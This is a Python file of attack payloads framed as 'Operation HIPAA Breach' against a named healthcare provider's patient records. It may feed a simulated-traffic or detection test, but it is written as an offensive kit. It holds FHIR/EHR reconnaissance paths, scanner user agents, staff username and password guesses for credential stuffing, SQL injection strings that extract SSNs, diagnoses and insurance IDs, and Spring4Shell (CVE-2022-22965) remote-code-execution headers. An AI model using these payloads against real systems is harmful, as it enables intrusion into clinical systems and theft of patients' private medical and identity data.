"""
Healthcare payloads — Operation HIPAA Breach
Targeting MedCore Health Systems patient PHI.
"""

RECON_PATHS = [
    "/api/fhir", "/api/fhir/metadata", "/api/fhir/Patient",
    "/api/fhir/Observation", "/api/fhir/Condition",
    "/.well-known/smart-configuration",
    "/ehr", "/ehr/records", "/ehr/login",
    "/portal", "/portal/login", "/portal/patient-search",
    "/admin", "/admin/reports",
    "/api/v1/patients", "/api/prescriptions", "/api/lab-results",
    "/patient-records",
]

SCANNER_AGENTS = [
    "FHIRScanner/1.0 (healthcare-recon)",
    "HL7Inspector/2.3",
    "EHRProbe/1.1 (custom scanner)",
    "python-requests/2.28.0",
    "Nikto/2.1.6",
    "MedAudit/3.0 (security scanner)",
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "zgrab/0.x",
]

PATIENT_IDS = list(range(1001, 1051))
COMMON_SURNAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Davis"]

EHR_USERNAMES = [
    "dr.johnson", "nurse.smith", "admin.portal", "ehr.admin",
    "records.manager", "dr.williams", "lab.tech",
    "pharmacy.admin", "billing.manager",
]

EHR_PASSWORDS = [
    "Hospital2023!", "MedStaff1!", "EHRaccess!", "Clinic@123",
    "HealthAdmin1!", "Medical2024!", "NursePass1!", "Doctor@2023",
]

SQLI_PHI = [
    "' UNION SELECT ssn,dob,diagnosis FROM patients--",
    "' OR 1=1--",
    "1 UNION SELECT patient_id,full_name,insurance_id FROM patients--",
    "' OR EXISTS(SELECT * FROM patient_records WHERE diagnosis LIKE '%cancer%')--",
    "name=' UNION SELECT ssn,dob,address FROM patients--",
    "1; SELECT * FROM prescriptions--",
    "' UNION SELECT null,patient_ssn,diagnosis_code FROM medical_records--",
    "1 AND SLEEP(5)--",
    "patient_id=1 OR 1=1 UNION SELECT * FROM lab_results--",
]

SPRING4SHELL_PAYLOADS = [
    {
        "ua": "Mozilla/5.0 (Spring4Shell exploit)",
        "header_value": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))",
        "x_request_id": "CVE-2022-22965-exploit",
    },
    {
        "ua": "Spring Framework RCE/CVE-2022-22965",
        "header_value": "class.module.classLoader.DefaultAssertionStatus=true",
        "x_request_id": "Spring4Shell/FHIR-target",
    },
    {
        "ua": "Mozilla/5.0 (compatible; CVE-2022-22965)",
        "header_value": "class.classLoader.DefaultAssertionStatus=true",
        "x_request_id": "Spring4Shell-PHI-exfil",
    },
]
